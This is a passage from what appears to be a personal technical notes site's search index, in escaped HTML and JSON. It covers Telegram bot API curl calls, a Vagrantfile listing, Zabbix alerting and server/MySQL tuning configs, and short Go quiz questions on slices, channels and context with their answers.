style=\"color:#e6db74\"\u003e\u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/getUpdates\u0026#39;\u003c/span\u003e | jq .\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esendMessage\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# chat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/sendMessage?chat_id=-12345\u0026amp;text=hello\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# thread\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/sendMessage?chat_id=-12345\u0026amp;text=hello\u0026amp;message_thread_id=14\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Telegram Command"},{"categories":null,"contents":" Vagrantfile template docker Nginx hyperv CentOS7 Win2019 virtualbox Vagrantfile vmware Vagrantfile multi Vagrantfile others common Vagrantfile Metasploitable3 Vagrantfile ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/vagrant/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eVagrantfile template\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"docker\"\u003edocker\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/docker/Vagrantfile\"\u003eNginx\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"hyperv\"\u003ehyperv\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/hyperv/Vagrantfile.CentOS7\"\u003eCentOS7\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/hyperv/Vagrantfile.Win2019\"\u003eWin2019\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"virtualbox\"\u003evirtualbox\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/virtualbox/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"vmware\"\u003evmware\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/vmware_fusion/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"multi\"\u003emulti\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/multi/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eothers\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"common\"\u003ecommon\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/common/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"metasploitable3\"\u003eMetasploitable3\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/metasploitable3/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Vagrant docs"},{"categories":null,"contents":" send alert Use Webhook, Create Channel and Webhook in Mattermost, and put script to $(grep AlertScriptsPath /etc/zabbix/zabbix_server.conf). Create Media types in Zabbix(Administration -\u0026gt; Medai types). Add media to user(Administration -\u0026gt; Users -\u0026gt; Media). Create action(Configuration -\u0026gt; Actions -\u0026gt; Trigger actions)。 Debug(Write log in script). Media types: PROBLEM:\\nProblem started at {EVENT.TIME} on {EVENT.DATE}\\n 問題: {EVENT.NAME}\\n 主機: {HOST.NAME}\\nSeverity: {EVENT.SEVERITY}\\n 目前數值: {EVENT.OPDATA}\\n 問題 ID: {EVENT.ID}\\n{TRIGGER.URL} RECOVERY:\\nProblem has been resolved at {EVENT.RECOVERY.TIME} on {EVENT.RECOVERY.DATE}\\n 問題: {EVENT.NAME}\\n 持續時間: {EVENT.DURATION}\\n 主機: {HOST.NAME}\\nSeverity: {EVENT.SEVERITY}\\n 問題 ID: {EVENT.ID}\\n{TRIGGER.URL} zabbix server /etc/zabbix/zabbix_server.conf Zabbix Server perform high loading, and slow query. Increase ValueCacheSize solve this problem.\nLogFile=/var/log/zabbix/zabbix_server.log LogFileSize=5 PidFile=/var/run/zabbix/zabbix_server.pid SocketDir=/var/run/zabbix DBHost=localhost DBName=zabbix_db DBUser=zabbix_user DBPassword=zabbix DBSocket=/data/mysql/mysql.sock StartPollers=200 StartPreprocessors=30 StartPollersUnreachable=30 StartTrappers=100 StartDiscoverers=30 SNMPTrapperFile=/var/log/snmptrap/snmptrap.log CacheSize=4G HistoryCacheSize=2G HistoryIndexCacheSize=2G TrendCacheSize=2G ValueCacheSize=24G Timeout=30 UnavailableDelay=120 AlertScriptsPath=/usr/lib/zabbix/alertscripts ExternalScripts=/usr/lib/zabbix/externalscripts LogSlowQueries=3000 StatsAllowedIP=127.0.0.1 /etc/my.cnf [client-server] socket=/data/mysql/mysql.sock [mysqld] socket=/data/mysql/mysql.sock datadir=/data/mysql character_set_server=utf8mb4 character_set_filesystem=utf8 max_allowed_packet=32M event_scheduler=1 default_storage_engine=innodb open_files_limit=65535 local_infile=1 sysdate_is_now=1 back_log=256 ##error log format # connection interactive_timeout=28800 wait_timeout=28800 lock_wait_timeout=28800 skip_name_resolve=1 max_connections=2000 max_user_connections=1000 max_connect_errors=1000000 # table cache performance settings # table_open_cache=8192 table_definition_cache=8192 table_open_cache_instances=16 # session memory settings # read_buffer_size=131072 read_rnd_buffer_size=262144 sort_buffer_size=262144 tmp_table_size=67108864 join_buffer_size=8M thread_cache_size=256 # log settings # ###slow log ### slow_query_log=1 log_queries_not_using_indexes=0 log_slow_admin_statements=1 #log_slow_slave_statements = 1 log_throttle_queries_not_using_indexes=1 long_query_time=0.5 log_bin_trust_function_creators=1 ###binlog ### binlog_cache_size=32K max_binlog_cache_size=1G max_binlog_size=2G expire_logs_days=31 log_slave_updates=1 #binlog_format=STATEMENT binlog_format=ROW slave_compressed_protocol = 1 # innodb settings # #innodb_data_file_path=ibdata1:4G;ibdata2:4G:autoextend innodb_page_size=16384 innodb_buffer_pool_size=4G innodb_buffer_pool_instances=1 innodb_buffer_pool_load_at_startup=1 innodb_buffer_pool_dump_at_shutdown=1 innodb_lock_wait_timeout=50 innodb_io_capacity=100 innodb_io_capacity_max=200 innodb_flush_neighbors=1 innodb_file_per_table=1 innodb_log_files_in_group=3 innodb_log_file_size=2G innodb_log_buffer_size=33554432 innodb_purge_threads=2 innodb_large_prefix=1 innodb_thread_concurrency=64 innodb_print_all_deadlocks=1 innodb_strict_mode=1 innodb_sort_buffer_size=67108864 innodb_write_io_threads=4 innodb_read_io_threads=4 innodb_online_alter_log_max_size=1G innodb_open_files=60000 innodb_max_dirty_pages_pct=75 innodb_adaptive_flushing=on innodb_flush_log_at_trx_commit=1 sync_binlog =1 [mysqld_safe] log-error=/var/log/mariadb/mariadb.log # # include *.cnf from the config directory # !includedir /etc/my.cnf.d ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/zabbix/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esend alert\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003col\u003e\n\u003cli\u003eUse Webhook, Create Channel and Webhook in Mattermost, and put script to $(grep AlertScriptsPath /etc/zabbix/zabbix_server.conf).\u003c/li\u003e\n\u003cli\u003eCreate Media types in Zabbix(Administration -\u0026gt; Medai types).\u003c/li\u003e\n\u003cli\u003eAdd media to user(Administration -\u0026gt; Users -\u0026gt; Media).\u003c/li\u003e\n\u003cli\u003eCreate action(Configuration -\u0026gt; Actions -\u0026gt; Trigger actions)。\u003c/li\u003e\n\u003cli\u003eDebug(Write log in script).\n\u003col\u003e\n\u003cli\u003eMedia types:\n\u003col\u003e\n\u003cli\u003ePROBLEM:\\nProblem started at {EVENT.TIME} on {EVENT.DATE}\\n 問題: {EVENT.NAME}\\n 主機: {HOST.NAME}\\nSeverity: {EVENT.SEVERITY}\\n 目前數值: {EVENT.OPDATA}\\n 問題 ID: {EVENT.ID}\\n{TRIGGER.URL}\u003c/li\u003e\n\u003cli\u003eRECOVERY:\\nProblem has been resolved at {EVENT.RECOVERY.TIME} on {EVENT.RECOVERY.DATE}\\n 問題: {EVENT.NAME}\\n 持續時間: {EVENT.DURATION}\\n 主機: {HOST.NAME}\\nSeverity: {EVENT.SEVERITY}\\n 問題 ID: {EVENT.ID}\\n{TRIGGER.URL}\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ezabbix server\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"etczabbixzabbix_serverconf\"\u003e/etc/zabbix/zabbix_server.conf\u003c/h6\u003e\n\u003cp\u003eZabbix Server perform high loading, and slow query. Increase ValueCacheSize solve this problem.\u003c/p\u003e","tags":null,"title":"Zabbix docs"},{"categories":null,"contents":" array package main import ( \u0026#34;fmt\u0026#34; ) func main() { a := [5]int{1, 2, 3, 4, 5} t := a[3:4:4] fmt.Println(t[0]) } A. 3 B. 4 C. compilation error Answer Try it B ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/array/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003earray\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 3\u003c/li\u003e\n\u003cli\u003eB. 4\u003c/li\u003e\n\u003cli\u003eC. compilation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/z3KqBXFXMm3\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Array"},{"categories":null,"contents":" channel package main import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { ch := make(chan int, 1000) go func() { for i := 0; i \u0026lt; 10; i++ { ch \u0026lt;- i } }() go func() { for { a, ok := \u0026lt;-ch if !ok { fmt.Println(\u0026#34;close\u0026#34;) return } fmt.Println(\u0026#34;a: \u0026#34;, a) } }() close(ch) fmt.Println(\u0026#34;ok\u0026#34;) time.Sleep(time.Second * 100) } Answer Try it ok panic: send on closed channel channel1 package main import ( \u0026#34;fmt\u0026#34; ) func main() { c := make(chan int) close(c) val, _ := \u0026lt;-c fmt.Println(val) } Answer Try it 0 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/questions/channel/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003echannel\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;time\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u0026lt; \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e !\u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;close\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a: \u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tclose(\u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ok\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSleep\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/OtDbNbLE1cH\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003eok\npanic: send on closed channel\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003echannel1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tclose(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eval\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eval\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/S9Juy0nlAvz\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Channel"},{"categories":null,"contents":" context package main import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; ) func f(ctx context.Context) { context.WithValue(ctx, \u0026#34;foo\u0026#34;, -6) } func main() { ctx := context.TODO() f(ctx) fmt.Println(ctx.Value(\u0026#34;foo\u0026#34;)) } A. -6 B. 0 C. \u0026lt;nil\u0026gt; D: panic Answer Try it C context1 package main import( \u0026#34;fmt\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;context\u0026#34; ) func main() { data, _ := json.Marshal(context.WithValue(context.Background(), \u0026#34;a\u0026#34;, 